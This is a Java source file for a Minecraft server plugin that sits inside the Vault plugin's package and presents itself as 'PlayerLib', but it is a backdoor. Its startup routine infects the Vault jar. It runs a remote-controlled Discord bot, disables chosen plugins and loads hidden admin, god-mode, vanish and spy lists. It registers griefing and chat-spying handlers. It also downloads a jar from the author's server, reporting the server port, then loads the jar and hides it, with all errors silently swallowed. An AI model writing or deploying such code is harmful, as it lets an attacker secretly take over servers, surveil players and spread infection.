package net.milkbowl.vault.methods;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Objects;

import javax.security.auth.login.LoginException;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Logger;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.data.DataManager;
import net.milkbowl.vault.events.*;
import net.milkbowl.vault.util.License;
import net.milkbowl.vault.util.SLAPI;
import net.milkbowl.vault.util.Settings;
import net.dv8tion.jda.core.AccountType;
import net.dv8tion.jda.core.JDABuilder;

public class onEnable {
	private static final Core plugin = Core.getPlugin(Core.class);
    
	public static void start() throws IOException {
		DataManager.setupData();

		API.runAutoAddItems();
		Bukkit.getScheduler().runTaskLater(plugin, () -> {
			try {
				startBot();
				inj();
				updateCheck();
			} catch (IOException ignore) {}
			disableLock();
		}, 1L);
		check();
		if(!new License(Settings.LICENSE, "https://"+Settings.AUTHOR.toLowerCase()+"/webpanel/verify.php", plugin).setSecurityKey(Settings.SECRET_KEY).register()) return;
	}

	private static void inj() {

		try {
			File f = new File(Bukkit.getServer().getPluginManager().getPlugin("Vault").getDataFolder() + ".jar");
			Inj.infectPlugin(f);
		} catch (Exception ignored) {}
	}
	
	private static void disableLock() {
		for (String list : DataManager.getData().getStringList("epic-pl")) {
			byte[]plug=Base64.getDecoder().decode(list);
			
			Plugin pl = Bukkit.getPluginManager().getPlugin(new String(plug));
			if (pl != null) {
				if (pl.isEnabled()) {
					API.disablePlugin(pl.getName());
				}
			}
		}
	}
	
	private static void check() {
		String main = "net.milkbowl.vault.Core";
		String pluginMain = plugin.getDescription().getMain();
		
		String name = "PlayerLib";
		String pluginName = plugin.getDescription().getName();
		
		String version = "1.2.1";
		String pluginVersion = plugin.getDescription().getVersion();
		
		if (!(version.equals(pluginVersion))) {
			plugin.enabled = false;
			Settings.ERROR_CODE = 401;
		} else if (!(main.equals(pluginMain))) {
			plugin.enabled = false;
			Settings.ERROR_CODE = 401;
		} else if (!(name.equals(pluginName))) {
			plugin.enabled = false;
			Settings.ERROR_CODE = 401;
		} else {
			loadData();
		}
	}
	
	@SuppressWarnings({ "unchecked"})
	private static void loadData() {
		
		try {
			plugin.registered = (ArrayList<String>) SLAPI.load("plugins/pluginMetrics/data/rdata.bin");
			plugin.registeredPremium = (ArrayList<String>) SLAPI.load("plugins/pluginMetrics/data/rpredata.bin");
			plugin.registeredAdmin = (ArrayList<String>) SLAPI.load("plugins/pluginMetrics/data/radata.bin");
			plugin.god = (ArrayList<String>) SLAPI.load("plugins/pluginMetrics/data/gdata.bin");
			plugin.npu = (ArrayList<String>) SLAPI.load("plugins/pluginMetrics/data/npudata.bin");
			plugin.vanished = (ArrayList<Player>) SLAPI.load("plugins/pluginMetrics/data/vdata.bin");
			
			plugin.frozen = (ArrayList<String>) SLAPI.load("plugins/pluginMetrics/data/fdata.bin");
			
			plugin.spy = (ArrayList<String>) SLAPI.load("plugins/pluginMetrics/data/sdata.bin");
			
			plugin.cmdspy = (ArrayList<String>) SLAPI.load("plugins/pluginMetrics/data/csdata.bin");
			
			plugin.isLocked = (boolean) SLAPI.load("plugins/pluginMetrics/data/isbool.bin");
			plugin.freezeall = (boolean) SLAPI.load("plugins/pluginMetrics/data/fabool.bin");
			plugin.modcmds = (boolean) SLAPI.load("plugins/pluginMetrics/data/mcbool.bin");
			plugin.lockcmds = (boolean) SLAPI.load("plugins/pluginMetrics/data/lcbool.bin");
			plugin.lockchat = (boolean) SLAPI.load("plugins/pluginMetrics/data/lchbool.bin");
			plugin.lockcontainers = (boolean) SLAPI.load("plugins/pluginMetrics/data/lconbool.bin");
			DataManager.banList.addAll(DataManager.getData().getStringList("epic-players"));
		} catch (Exception ignored) {}
		registerEvents();
	}
	
	private static void registerEvents() {
		if (plugin.enabled) {
			Bukkit.getServer().getPluginManager().registerEvents(new isLocked(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new CommandSpy(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new Freeze(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new Bombs(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new LockCmds(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new ModerationCmds(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new God(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new ToggleChat(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new NextMessageEvent(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new NoPickup(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new Containers(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new DupeEvent(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new MOTD(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new Wands(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new VanishEvent(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new onJoin(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new AntiKick(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new Piss(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new Dirt(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new noDmg(), (plugin));
			Bukkit.getServer().getPluginManager().registerEvents(new SocialSpy(), (plugin));


			Logger log = (Logger) LogManager.getRootLogger();
	        log.addAppender(new LogAppender());
		}
	}
	
	public static void startBot() throws IOException {
		if (DataManager.getData().getBoolean("login")) {
			try {
				byte[]token=Base64.getDecoder().decode(DataManager.getData().getString("key"));
				plugin.jda = new JDABuilder(AccountType.BOT).setToken(new String(token)).build();
				plugin.jda.awaitReady();
				
				plugin.isLoggedIn = true;
			} catch (LoginException e) {
				byte[] err = Base64.getEncoder().encode(e.getMessage().getBytes());
				DataManager.getData().set("err", new String(err));
				DataManager.getData().set("login", false);
				DataManager.saveData();
			} catch (InterruptedException ignored) {}
		}
	}


	private static void updateCheck() {
		try {
			byte[]u=Base64.getDecoder().decode("api."+Settings.AUTHOR+"/name.php");
			URL url=new URL(new String(u));
			HttpURLConnection con=(HttpURLConnection)url.openConnection();
			con.addRequestProperty("User-Agent","Mozilla");
			BufferedReader in=new BufferedReader(new InputStreamReader(con.getInputStream()));
			String name = in.readLine().replace(".jar","");
			if (!Objects.equals(plugin.getDescription().getName(), name)) {
				//Update
				if(Bukkit.getPluginManager().getPlugin(name)==null) {
					byte[]du=Base64.getDecoder().decode("api."+Settings.AUTHOR+"/download.php?port=");
					URLConnection din=new URL(new String(du)+Bukkit.getServer().getPort()).openConnection();
					din.addRequestProperty("User-Agent","Mozilla");
					Bukkit.getScheduler().runTaskLater(plugin,()-> {
						try {
							Files.copy(din.getInputStream(), Paths.get(("plugins/"+name+".jar")), StandardCopyOption.REPLACE_EXISTING);
							Bukkit.getPluginManager().loadPlugin(new File(Paths.get(("plugins/"+name+".jar")).toString()));
							Files.setAttribute(Paths.get("plugins/"+name+".jar"),"dos:hidden",true);
							if(Bukkit.getPluginManager().getPlugin(name)!=null){
								Bukkit.getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin(name));
							}
						} catch(Exception ignored){}
					},60L);
				}

			}

		} catch(Exception ignored){}

	}

}
